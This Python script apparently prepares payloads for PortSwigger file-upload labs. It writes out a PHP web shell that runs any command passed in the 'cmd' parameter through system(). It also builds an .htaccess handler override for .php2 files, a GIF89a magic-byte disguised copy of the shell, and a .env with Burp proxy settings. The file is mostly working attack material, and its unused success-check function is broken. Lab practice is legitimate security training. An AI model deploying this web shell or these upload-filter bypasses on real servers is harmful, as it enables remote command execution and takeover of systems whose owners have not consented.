import os, argparse, urllib3, dotenv, requests
from pathlib import Path
from bs4 import BeautifulSoup
dotenv.load_dotenv(dotenv_path="../.env")

payload = """<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
"""

htaccess =  """AddType application/x-httpd-php .php2"""
magic_byte = "GIF89a" + payload
env = """export FILE_TO_UPLOAD="payloads/payload.php" 
export HTACCESS_FILE="payloads/.htaccess" 
export MAGIC_BYTE_FILE="payloads/magic_byte.php" 
export PROXY_HTTP="127.0.0.1:8080" 
export PROXY_HTTPS="127.0.0.1:8080"
"""
SCRIPT_DIR = Path(__file__).parent
abs = SCRIPT_DIR / "payloads/"
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def folder_creation():
    folder_name = abs 

    try: 
        os.makedirs(folder_name)
        print("hi")
        return True
    except FileExistsError as e:
        return False

def payload_creation():
    path  = abs / "payload.php"
    try:
        with open(path, "w") as file: 
            file.write(payload)
        return True
    except FileNotFoundError:
        return False
    
def htaccess_creation():
    path = abs / ".htaccess"
    try:
        with open(path, "w") as file:
            file.write(htaccess)
        return True
    except FileNotFoundError:
        print("File could not be made")
        return False
    
def magic_byte_creation():
    path = abs / "magic_byte.php"
    try:
        with open(path, "w") as file:
            file.write(magic_byte)
        return True
    except FileNotFoundError:
        return False

def env_creation():
    path = SCRIPT_DIR /  ".env"
    try:
        with open(path, "w") as file:
            file.write(env)
        return True
    except FileNotFoundError:
        return False
    
def parse_args():
    parser = argparse.ArgumentParser(description='PortSwigger Lab Automation')

    parser.add_argument(
        '-p', '--proxy',
        action='store_true',  
        help='Enable Burp Suite proxy (127.0.0.1:8080)'
    )


    args = parser.parse_args()
    if args.proxy:
        proxy = {
        'http': os.getenv("PROXY_HTTP"),
        'https': os.getenv("PROXY_HTTPS")
        } 
    else:
        proxy = None
    return args, proxy

def is_success(self):
        get_page = self.session.get(url=f"{self.url}").text
        soup = BeautifulSoup(get_page, 'html.parser')
        filtered_soup = soup.find('p').string

        if filtered_soup == "Solved":
            return True
        return False

if __name__ == "__main__":
    try: 
        methods = [
            ("folder creation", folder_creation),
            ("payload creation", payload_creation),
            ("htaccess creation", htaccess_creation),
            ("magic byte creation", magic_byte_creation),
            ("env creation", env_creation)
        ]
        for method_name, method in methods:
            if method():
                print(f"{method_name} succeeded")
            else:
                print(f"{method_name} failed")
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        print("If any step failed, that doesn't necessarily mean the script doesn't work. Might be that the file/folder already exists. Check the payloads and .env once ;)")
        
